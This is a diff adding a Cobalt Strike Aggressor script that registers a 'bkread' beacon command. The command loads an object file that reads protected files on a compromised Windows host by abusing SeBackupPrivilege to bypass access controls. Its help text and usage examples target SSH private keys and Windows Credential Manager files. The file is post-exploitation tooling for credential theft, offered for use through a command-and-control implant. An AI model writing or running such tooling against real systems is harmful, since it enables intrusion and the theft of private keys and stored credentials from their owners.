@@ -1,0 +1,73 @@
+#
+# bkread BOF - SeBackupPrivilege-backed file reader
+#
+# Reads file content without modifying ownership or DACLs.
+#
+
+beacon_command_register(
+    "bkread",
+    "Read a file with SeBackupPrivilege and FILE_FLAG_BACKUP_SEMANTICS",
+    "Synopsis: bkread <path> [--max-bytes|-m <bytes>]\n\n" .
+    "Read a file using a backup-semantics CreateFileW open.\n" .
+    "This is useful when the current token holds SeBackupPrivilege but the file DACL denies normal reads.\n\n" .
+    "Arguments:\n" .
+    "  <path>                 Target file path to read\n" .
+    "  --max-bytes, -m        Maximum bytes to stream (default: 1048576, max: 16777216)\n\n" .
+    "Examples:\n" .
+    "  bkread C:\\Users\\alice\\.ssh\\id_ed25519\n" .
+    "  bkread C:\\Users\\alice\\.ssh\\id_rsa --max-bytes 8192\n" .
+    "  bkread \"C:\\Users\\alice\\AppData\\Roaming\\Microsoft\\Credentials\\file\" -m 65536\n\n" .
+    "Notes:\n" .
+    "  - Read-only: does not change ownership or ACLs\n" .
+    "  - Intended for known file paths\n" .
+    "  - Directory listing is not implemented in this BOF\n"
+);
+
+alias bkread {
+    local('$bof $args $path $maxBytes $i');
+
+    if (size(@_) < 2) {
+        berror($1, "Usage: bkread <path> [--max-bytes|-m <bytes>]");
+        berror($1, "Example: bkread C:\\Users\\alice\\.ssh\\id_rsa --max-bytes 8192");
+        return;
+    }
+
+    $path = @_[1];
+    $maxBytes = 1048576;
+
+    for ($i = 2; $i < size(@_); $i++) {
+        if (@_[$i] eq "--max-bytes" || @_[$i] eq "-m") {
+            $i++;
+            if ($i >= size(@_)) {
+                berror($1, "--max-bytes requires a value");
+                return;
+            }
+            $maxBytes = int(@_[$i]);
+        }
+        else {
+            berror($1, "Unknown option: " . @_[$i]);
+            return;
+        }
+    }
+
+    if (strlen($path) == 0) {
+        berror($1, "Path cannot be empty");
+        return;
+    }
+
+    if ($maxBytes < 1 || $maxBytes > 16777216) {
+        berror($1, "Invalid max-bytes value. Allowed range: 1-16777216.");
+        return;
+    }
+
+    $bof = script_resource("bkread." . barch($1) . ".o");
+    if (!-exists $bof) {
+        berror($1, "BOF file not found: " . $bof);
+        return;
+    }
+
+    # Pack arguments: Zi (path, maxBytes)
+    $args = bof_pack($1, "Zi", $path, $maxBytes);
+
+    beacon_inline_execute($1, readbof($bof), "go", $args);
+}
